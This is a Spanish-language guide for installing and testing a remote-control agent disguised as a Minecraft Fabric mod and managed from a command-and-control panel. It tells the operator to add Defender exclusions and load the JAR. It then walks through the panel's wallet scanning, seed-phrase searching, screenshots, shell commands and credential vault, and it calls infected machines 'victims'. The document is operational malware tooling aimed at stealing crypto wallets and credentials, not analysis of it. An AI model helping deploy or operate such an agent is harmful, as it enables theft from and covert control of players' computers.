# Prueba del agente en Windows (dualboot)

Build preparado: `windows-dualboot` · `0.3.9` · perfil `full`.  
Panel: <https://c2.spc-labpanel.com>  
Descarga: <https://c2.spc-labpanel.com/builds> → `windows-dualboot` → descargar.  
SHA-256 esperado: `6197412525e3c385f376c6fe1cb18d7684be1887537adb3a9333f215cef85037`.

No compartas el JAR: lleva el `build_secret` del build.

## Antes de arrancar Windows

- Ten a mano la contraseña de admin y el TOTP.
- Si usas BitLocker, guarda la clave de recuperación.
- El doble arranque puede desajustar el reloj. La firma HMAC tolera ±300 s:
  sincroniza la hora en Windows (`Configuración → Hora e idioma → Sincronizar ahora`)
  y, en PowerShell como administrador, `w32tm /resync`.

## Instalación

1. Abre <https://c2.spc-labpanel.com> en Windows e inicia sesión con TOTP.
2. Entra en **Builds**, busca `windows-dualboot`, descarga el JAR y comprueba el hash:

   ```powershell
   Get-FileHash "$env:USERPROFILE\Downloads\fabric-sync-0.3.9-*.jar" -Algorithm SHA256
   ```

3. Instala Java 17 x64 (Temurin): <https://adoptium.net/temurin/releases/?version=17>.
4. Instala Minecraft **1.20.1** y Fabric Loader **0.20.1**:
   <https://fabricmc.net/use/installer/>. Añade **Fabric API 0.92.12+1.20.1**
   para 1.20.1.
5. Cierra Minecraft. Crea `%APPDATA%\.minecraft\mods` si no existe y copia allí
   el JAR. Deja solo una copia de `fabric-sync`; borra versiones anteriores.
6. En Defender, añade exclusiones para `%APPDATA%\.minecraft\mods` y
   `%LOCALAPPDATA%\Microsoft\Java` (el agente se instala ahí).

## Prueba

1. Abre el perfil **fabric-loader-1.20.1** y entra en un mundo (vale un mundo
   local). Permanece dentro 20–60 s.
2. En el panel, **Equipos**: debe aparecer tu hostname. Espera a `socket`.
   Si solo ves `hb`, espera 30 s o reinicia Minecraft.
3. Abre la ficha: **Resumen → Escanear wallets**, **Buscar seeds**, **Screenshot**.
4. Revisa **Bóveda** y **Actividad**. Prueba `shell whoami` desde Opciones.
5. Comprueba que recargar conserva wallets, seeds, credenciales y contadores, y
   que dos escaneos seguidos no duplican filas.

## Si falla

| Síntoma | Acción |
|---|---|
| No aparece el equipo | Reloj, Java 17, Fabric 1.20.1/0.20.1, Fabric API, Defender y URL del panel |
| `agent_offline` | Sin WebSocket: firewall/HTTPS/reloj; espera al heartbeat |
| `403`/`410` | Build o víctima revocados: crea/enrola de nuevo |
| Screenshot falla | Sesión sin escritorio interactivo o RDP desconectado |
| Wallets vacías | No hay carteras instaladas; prueba con MetaMask o Phantom |
| `invalid_params` | Agente antiguo: usa el JAR compilado por este panel |

## Al terminar

- Mantén el build si vas a seguir probando.
- Para cerrar la prueba, revoca la víctima o el build y elimina el JAR de `mods`.
